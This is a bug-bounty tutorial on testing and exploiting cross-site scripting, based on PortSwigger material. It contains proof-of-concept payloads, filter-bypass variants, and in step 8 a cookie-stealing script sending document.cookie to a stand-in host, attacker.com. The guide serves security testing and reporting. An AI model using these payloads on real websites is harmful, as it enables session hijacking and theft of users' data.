# Cross-Site Scripting (XSS)

[Relative Cheat Sheet](./xss-cheat.md)

## Step-by-Step Guide for Testing and Exploiting Cross-Site Scripting (XSS) Vulnerabilities

### 1. Understand XSS and Its Types
   - **Explanation**: Cross-site scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. The injected script runs in the context of the victim's browser, potentially stealing sensitive data, defacing websites, or performing actions on behalf of the user. There are three main types: reflected XSS (script from current request reflected in response), stored XSS (script stored on server and served to users), and DOM-based XSS (script executed via client-side JavaScript modifying the DOM).
   - **Why It's Done**: Grasping the types helps tailor testing to specific scenarios, such as immediate reflection in search results (reflected) or persistent injection in comments (stored). This step sets the foundation for effective payload crafting and exploitation.
   - **Example**: In reflected XSS, a search query like `<script>alert('XSS')</script>` might be echoed back in the results page, executing the alert for the user.

### 2. Identify Entry Points for User Input
   - **Explanation**: Locate all places where user input is accepted and potentially rendered back, such as URL parameters, form fields, headers, or even cookies. Use browser developer tools or proxies like Burp Suite to map these inputs.
   - **Why It's Done**: XSS requires an injection point where unsanitized input is outputted. Identifying these ensures comprehensive testing and prevents missing subtle vulnerabilities.
   - **Example**: A URL like `https://example.com/search?q=user_input` where `q` is reflected in the page without escaping.

### 3. Submit Unique Test Input to Track Reflection
   - **Explanation**: Input a unique string (e.g., `xss-test-string-123`) into each entry point and monitor where it appears in the response using tools like search functions in DevTools or Burp.
   - **Why It's Done**: This traces how input flows through the application, revealing reflection points for potential injection. It helps distinguish between safe (escaped) and vulnerable (unescaped) outputs.
   - **Example**: Submit the string in a form; if it appears unescaped in the HTML response, it's a candidate for XSS.

### 4. Analyze the Context of Reflection
   - **Explanation**: Determine the context where the input is reflected—HTML body, attribute, JavaScript string, etc.—as this affects the required payload structure.
   - **Why It's Done**: Different contexts need specific escape sequences or syntax to break out and execute code. For instance, JavaScript contexts require breaking out of strings.
   - **Example**: If input is in `<div>user_input</div>`, it's HTML context; if in `var data = "user_input";`, it's JavaScript context.

### 5. Craft and Test Proof-of-Concept (PoC) Payloads
   - **Explanation**: Start with simple payloads like `<script>alert(1)</script>` for HTML contexts or `';alert(1);//` for JavaScript. Use `print()` if `alert` is blocked in newer browsers.
   - **Why It's Done**: A PoC confirms execution capability without harm, validating the vulnerability before escalation.
   - **Example**: For reflected XSS: `https://example.com/search?q=<script>alert(1)</script>`. If an alert pops, it's vulnerable.

### 6. Differentiate Between Reflected, Stored, and DOM-Based XSS
   - **Explanation**: For reflected, check if payload executes only on submission; for stored, reload the page or visit affected areas; for DOM-based, inspect client-side JS for unsafe sinks like `innerHTML`.
   - **Why It's Done**: Each type has different persistence and impact—stored affects multiple users, DOM-based is client-side only.
   - **Example**: Stored XSS in a comment: Submit payload, view comment section to see execution.

### 7. Test for Filter Bypasses
   - **Explanation**: If basic payloads fail, vary case (`<ScRiPt>`), use alternative tags (`<img src=x onerror=alert(1)>`), or encode (`<script>alert&#40;1&#41;</script>`).
   - **Why It's Done**: Applications often have WAFs or filters blocking common payloads; bypasses uncover hidden vulnerabilities.
   - **Example**: If `<script>` is blocked, use `<svg onload=alert(1)>`.

### 8. Exploit the Vulnerability for Impact
   - **Explanation**: Escalate from PoC to real impact, like stealing cookies (`document.cookie` sent to attacker server) or defacing (`document.body.innerHTML = 'Hacked';`).
   - **Why It's Done**: Demonstrates severity for bounty reports, such as session hijacking or phishing.
   - **Example**: `<script>new Image().src='https://attacker.com/?c='+document.cookie;</script>` to exfiltrate cookies.

### 9. Chain with Other Vulnerabilities
   - **Explanation**: Combine XSS with CSRF or session fixation for amplified attacks, e.g., using XSS to forge requests.
   - **Why It's Done**: Real-world exploits often chain vulns for greater impact, like persistent access.
   - **Example**: Stored XSS injecting CSRF payload to change user email.

### 10. Assess Prevention Measures
   - **Explanation**: Verify if the app uses Content Security Policy (CSP), input sanitization, or output encoding to block XSS.
   - **Why It's Done**: To recommend fixes in reports, like escaping user input or implementing CSP headers.
   - **Example**: CSP `default-src 'self'` blocks inline scripts unless nonce used.

This guide, based on PortSwigger Web Security Academy, equips hunters to systematically find and report XSS for bounties. Always test ethically and report responsibly.